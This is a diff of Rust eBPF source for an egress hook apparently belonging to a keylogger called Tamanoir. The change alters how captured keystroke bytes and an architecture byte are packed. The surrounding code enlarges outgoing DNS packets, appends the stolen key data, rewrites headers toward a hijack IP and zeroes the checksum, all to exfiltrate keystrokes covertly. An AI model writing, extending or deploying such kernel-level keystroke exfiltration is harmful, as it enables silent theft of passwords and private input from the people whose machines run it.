@@ -15,8 +15,8 @@ use network_types::{
 
 use crate::common::{
     inject_keys, load_bytes, store_bytes, update_addr, update_ip_hdr_tot_len, update_udp_hdr_len,
-    UpdateType, BPF_ADJ_ROOM_NET, DATA, DNS_PAYLOAD_MAX_LEN, DNS_QUERY_OFFSET, HIJACK_IP,
-    KEYS_EVENTS_LEN, KEYS_PAYLOAD_LEN, TARGET_IP, UDP_DEST_PORT_OFFSET, UDP_OFFSET,
+    UpdateType, ARCH, BPF_ADJ_ROOM_NET, DATA, DNS_PAYLOAD_MAX_LEN, DNS_QUERY_OFFSET, HIJACK_IP,
+    KEYS_PAYLOAD_LEN, TARGET_IP, UDP_DEST_PORT_OFFSET, UDP_OFFSET,
 };
 
 pub struct Buf {
@@ -36,10 +36,9 @@ pub fn tamanoir_egress(mut ctx: TcContext) -> i32 {
 
 fn read_keys() -> [u8; KEYS_PAYLOAD_LEN] {
     let mut res = [0u8; KEYS_PAYLOAD_LEN];
-    for k in 0..KEYS_EVENTS_LEN {
-        let item = DATA.pop().unwrap_or_default();
-        res[2 * k] = item.layout;
-        res[2 * k + 1] = item.key;
+    res[0] = unsafe { core::ptr::read_volatile(&ARCH) };
+    for item in res.iter_mut().take(KEYS_PAYLOAD_LEN).skip(1) {
+        *item = DATA.pop().unwrap_or_default();
     }
     res
 }
@@ -47,6 +46,7 @@ fn read_keys() -> [u8; KEYS_PAYLOAD_LEN] {
 fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, i64> {
     let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
     let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };
+
     let ethhdr: EthHdr = ctx.load(0)?;
     if let EtherType::Ipv4 = ethhdr.ether_type {
         let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN)?;
@@ -85,7 +85,7 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, i64> {
                         &(u16::from_be(header.tot_len) + KEYS_PAYLOAD_LEN as u16).to_be(),
                     )?;
 
-                    //make room
+                    // make room
                     debug!(ctx, "adjust room");
                     ctx.skb
                         .adjust_room(KEYS_PAYLOAD_LEN as i32, BPF_ADJ_ROOM_NET, 0)
@@ -102,7 +102,7 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, i64> {
                         &(u16::from_be(udp_hdr.len) + KEYS_PAYLOAD_LEN as u16).to_be(),
                     )?;
 
-                    //move dns payload
+                    // move dns payload
                     let buf = unsafe {
                         let ptr = DNS_BUFFER.get_ptr(0).ok_or(-1)?;
                         &(*ptr).buf
@@ -111,7 +111,7 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, i64> {
                     store_bytes(ctx, DNS_QUERY_OFFSET, buf, 0)?;
                     inject_keys(ctx, DNS_QUERY_OFFSET + dns_payload_len, keys)?;
 
-                    //set current csum to 0
+                    // set current csum to 0
                     ctx.store(crate::common::UDP_CSUM_OFFSET, &0u16, 2)
                         .map_err(|_| {
                             error!(ctx, "error zeroing L4 csum");
